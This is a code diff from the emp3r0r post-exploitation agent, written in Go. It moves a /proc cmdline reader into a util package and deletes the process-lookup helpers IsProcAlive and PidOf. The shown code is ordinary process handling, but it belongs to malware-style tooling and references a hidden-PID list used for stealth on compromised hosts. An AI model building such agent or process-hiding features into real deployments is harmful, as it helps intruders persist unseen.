@@ -10,7 +10,6 @@ import (
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	gops "github.com/mitchellh/go-ps"
 )
 
 // CheckAgentProcess fill up info.AgentProcess
@@ -18,22 +17,10 @@ func CheckAgentProcess() *AgentProcess {
 	p := &AgentProcess{}
 	p.PID = os.Getpid()
 	p.PPID = os.Getppid()
-	p.Cmdline = ProcCmdline(p.PID)
-	p.Parent = ProcCmdline(p.PPID)
+	p.Cmdline = util.ProcCmdline(p.PID)
+	p.Parent = util.ProcCmdline(p.PPID)
 
 	return p
-}
-
-// ProcCmdline read cmdline data of a process
-func ProcCmdline(pid int) (cmdline string) {
-	data, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-	if err != nil {
-		log.Println(err)
-		return
-	}
-	cmdline = string(data)
-
-	return
 }
 
 // UpdateHIDE_PIDS update HIDE PID list
@@ -80,48 +67,4 @@ func ProcUID(pid int) string {
 		}
 	}
 	return ""
-}
-
-// IsProcAlive check if a process name exists, returns its process(es)
-func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
-	allprocs, err := gops.Processes()
-	if err != nil {
-		log.Println(err)
-		return
-	}
-
-	for _, p := range allprocs {
-		if p.Executable() == procName {
-			alive = true
-			proc, err := os.FindProcess(p.Pid())
-			if err != nil {
-				log.Println(err)
-			}
-			procs = append(procs, proc)
-		}
-	}
-
-	return
-}
-
-// PidOf PID of a process name
-func PidOf(name string) []int {
-	pids := make([]int, 1)
-	allprocs, err := gops.Processes()
-	if err != nil {
-		log.Println(err)
-		return pids
-	}
-
-	for _, p := range allprocs {
-		if p.Executable() == name {
-			proc, err := os.FindProcess(p.Pid())
-			if err != nil {
-				log.Println(err)
-			}
-			pids = append(pids, proc.Pid)
-		}
-	}
-
-	return pids
 }
